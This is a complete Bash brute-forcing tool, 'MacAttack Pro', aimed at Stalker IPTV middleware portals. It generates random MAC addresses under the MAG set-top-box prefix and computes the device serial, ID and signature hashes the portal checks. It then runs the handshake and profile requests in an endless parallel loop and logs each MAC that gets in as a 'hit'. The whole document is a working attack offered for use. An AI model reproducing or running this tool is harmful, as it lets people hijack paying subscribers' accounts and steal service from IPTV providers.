#!/bin/bash

# MacAttack Pro - Premium Shell Edition
# ---------------------------------------------------------
# A lightning-fast, zero-dependency Bash GUI brute-forcer for Stalker Portals.
# Features multithreading, beautiful ANSI graphics, and proper MAC hashing.

# --- Colors & Styling ---
RED='\033[38;5;196m'
GREEN='\033[38;5;46m'
CYAN='\033[38;5;51m'
PURPLE='\033[38;5;135m'
YELLOW='\033[38;5;226m'
WHITE='\033[38;5;231m'
GREY='\033[38;5;242m'
BOLD='\033[1m'
RESET='\033[0m'

# --- Variables ---
PORTAL=""
PREFIX="00:1A:79"
THREADS=10
OUTPUT_FILE="MacAttack_Hits.txt"
TOTAL_TESTED=0

trap 'banner_finish; exit' INT

draw_banner() {
    clear
    echo -e "${PURPLE}${BOLD}"
    cat << 'EOF'
 𓆩◉𓆪══════════════════════════════════════════════════════════════════𓆩◉𓆪
 ║  __  __               _   _   _             _      ____  ____   ___  ║
 ║ |  \/  | __ _  ___   / \ | |_| |_ __ _  ___| | __ |  _ \|  _ \ / _ \ ║
 ║ | |\/| |/ _` |/ __| / _ \| __| __/ _` |/ __| |/ / | |_) | |_) | | | |║
 ║ | |  | | (_| | (__ / ___ \ |_| || (_| | (__|   <  |  __/|  _ <| |_| |║
 ║ |_|  |_|\__,_|\___/_/   \_\__|\__\__,_|\___|_|\_\ |_|   |_| \_\\___/ ║
 ║                         PREMIUM SHELL EDITION                        ║
 𓆩◉𓆪══════════════════════════════════════════════════════════════════𓆩◉𓆪
EOF
    echo -e "${RESET}"
}

banner_finish() {
    echo -e "\n${CYAN}𓆩◉𓆪═══🔹️✦💚 ${BOLD}𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃${RESET}${CYAN} 💚✦🔹️═══𓆩◉𓆪${RESET}"
    echo -e "${WHITE}╠☞ All Tasks have completed. Total Tested: ${TOTAL_TESTED}${RESET}"
    echo -e "${CYAN}𓆩◉𓆪══════════════════════════════════𓆩◉𓆪${RESET}\n"
}

# --- Core Functions ---
generate_random_mac() {
    # Generates a random MAC appending to the prefix
    hexchars="0123456789ABCDEF"
    echo "${PREFIX}:$(echo ${hexchars:$((RANDOM%16)):1}${hexchars:$((RANDOM%16)):1}):$(echo ${hexchars:$((RANDOM%16)):1}${hexchars:$((RANDOM%16)):1}):$(echo ${hexchars:$((RANDOM%16)):1}${hexchars:$((RANDOM%16)):1})"
}

check_mac() {
    local mac=$1
    local portal=$2
    
    # Generate Hashes (Standard Stalker Auth)
    local serialnumber=$(echo -n "$mac" | md5sum | awk '{print toupper($1)}')
    local sn=${serialnumber:0:13}
    local device_id=$(echo -n "$sn" | sha256sum | awk '{print toupper($1)}')
    local device_id2=$(echo -n "$mac" | sha256sum | awk '{print toupper($1)}')
    local hw_version_2=$(echo -n "$mac" | sha1sum | awk '{print $1}')
    local snmac="${sn}${mac}"
    local sig=$(echo -n "$snmac" | sha256sum | awk '{print toupper($1)}')

    # 1. Handshake Request
    local handshake_url="${portal}/stalker_portal/server/load.php?type=stb&action=handshake&token=&JsHttpRequest=1-xml"
    local cookie_header="Cookie: mac=${mac}; stb_lang=en; timezone=Europe/Kiev; adid=${hw_version_2}; device_id2=${device_id2}; device_id=${device_id}; hw_version=1.7-BD-00; sn=${sn}"
    
    local handshake_resp=$(curl -s -m 10 -H "$cookie_header" -H "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C)" "$handshake_url")
    
    local token=$(echo "$handshake_resp" | grep -o '\"token\":\"[^\"]*' | cut -d '"' -f 4)
    local random_token=$(echo "$handshake_resp" | grep -o '\"random\":\"[^\"]*' | cut -d '"' -f 4)

    if [[ -z "$token" ]]; then
        echo -e "${GREY}[-] MAC: ${mac} | Status: DEAD (No Token)${RESET}"
        return 1
    fi

    # 2. Get Profile Request
    local profile_url="${portal}/stalker_portal/server/load.php?type=stb&action=get_profile&hd=1&sn=${sn}&stb_type=MAG250&client_type=STB&device_id=${device_id}&device_id2=${device_id2}&sig=${sig}&hw_version=1.7-BD-00"
    local auth_header="Authorization: Bearer ${token}"
    
    local profile_resp=$(curl -s -m 10 -H "$cookie_header" -H "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C)" -H "$auth_header" "$profile_url")

    # If it contains "parent_password" or "expires", it's usually a successful login
    if echo "$profile_resp" | grep -q '"mac"'; then
        echo -e "${CYAN}𓆩◉𓆪══════════════════════════════════𓆩◉𓆪${RESET}"
        echo -e "${CYAN}╠☞ ${BOLD}${GREEN}ACTIVE HIT FOUND!${RESET}"
        echo -e "${CYAN}╠☞ 𝐏𝐨𝐫𝐭𝐚𝐥   ➢ ${WHITE}${portal}${RESET}"
        echo -e "${CYAN}╠☞ 𝐌𝐀𝐂      ➢ ${WHITE}${mac}${RESET}"
        
        # Save to file
        echo "======================================" >> "$OUTPUT_FILE"
        echo "Portal : $portal" >> "$OUTPUT_FILE"
        echo "MAC    : $mac" >> "$OUTPUT_FILE"
        echo "Status : ACTIVE" >> "$OUTPUT_FILE"
        echo "======================================" >> "$OUTPUT_FILE"
        
        echo -e "${CYAN}𓆩◉𓆪══════════════════════════════════𓆩◉𓆪${RESET}"
    else
        echo -e "${GREY}[-] MAC: ${mac} | Status: INVALID FOR PORTAL${RESET}"
    fi
}

# --- Main Program ---
draw_banner

echo -e "${CYAN}Please configure your attack:${RESET}\n"

read -p "$(echo -e ${WHITE}1. Enter Stalker Portal URL ${GREY}[e.g., http://example.com]${WHITE}: ${RESET})" PORTAL
if [[ -z "$PORTAL" ]]; then
    echo -e "${RED}Portal URL cannot be empty! Exiting.${RESET}"
    exit 1
fi

read -p "$(echo -e ${WHITE}2. Enter MAC Prefix ${GREY}[Default: 00:1A:79]${WHITE}: ${RESET})" INPUT_PREFIX
PREFIX=${INPUT_PREFIX:-00:1A:79}

read -p "$(echo -e ${WHITE}3. Enter Threads/Speed ${GREY}[Default: 10]${WHITE}: ${RESET})" INPUT_THREADS
THREADS=${INPUT_THREADS:-10}

echo -e "\n${GREEN}Starting Attack Engine with ${THREADS} threads...${RESET}\n"

# Export vars and functions for xargs parallelization
export -f check_mac
export -f generate_random_mac
export PREFIX
export PORTAL
export CYAN GREEN WHITE GREY BOLD RESET OUTPUT_FILE

# Infinite parallel testing loop
while true; do
    for ((i=1; i<=THREADS; i++)); do
        generate_random_mac
    done | xargs -P "$THREADS" -I {} bash -c 'check_mac "{}" "$PORTAL"'
    
    TOTAL_TESTED=$((TOTAL_TESTED + THREADS))
done
